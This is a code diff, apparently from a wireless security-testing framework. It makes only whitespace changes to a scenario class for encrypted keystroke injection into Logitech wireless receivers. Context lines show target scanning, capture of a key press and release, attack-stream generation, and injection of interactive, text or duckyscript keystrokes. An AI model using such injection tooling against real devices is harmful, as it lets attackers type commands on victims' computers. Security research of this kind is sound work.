@@ -67,10 +67,10 @@ class logitech_encrypted_keystrokes_injection(scenario.Scenario):
 		io.info("Looking for target "+str(self.target)+"...")
 		while not self.emitter.scan():
 			utils.wait(seconds=0.1)
-		io.success("Target found !")	
+		io.success("Target found !")
 		while self.lastKeyPress is None or self.lastKeyRelease is None:
 			utils.wait(seconds=0.1)
-		
+
 		io.info("Generating attack stream ...")
 		attackStream = self.startLogitechInjection()
 
@@ -99,7 +99,7 @@ class logitech_encrypted_keystrokes_injection(scenario.Scenario):
 			io.fail("You must provide one of the following parameters:\n\tINTERACTIVE : live keystroke injection\n\tTEXT : simple text injection\n\tDUCKYSCRIPT : duckyscript injection")
 			self.module.stopScenario()
 			return True
-		
+
 		io.info("Injecting ...")
 		self.emitter.sendp(*attackStream)
 		if self.mode != "interactive":
@@ -116,7 +116,7 @@ class logitech_encrypted_keystrokes_injection(scenario.Scenario):
 			self.keepAliveThread.stop()
 			self.keepAliveThread = None
 		return True
-	
+
 	def onKey(self,key):
 		if key == "esc":
 			self.module.stopScenario()
@@ -136,4 +136,4 @@ class logitech_encrypted_keystrokes_injection(scenario.Scenario):
 			self.emitter.clear()
 			self.emitter.sendp(*(self.addLogitechKeystroke(key=injectedKeystroke,locale="fr")+self.addLogitechDelay()))
 			self.lock.release()
-		return True	
+		return True
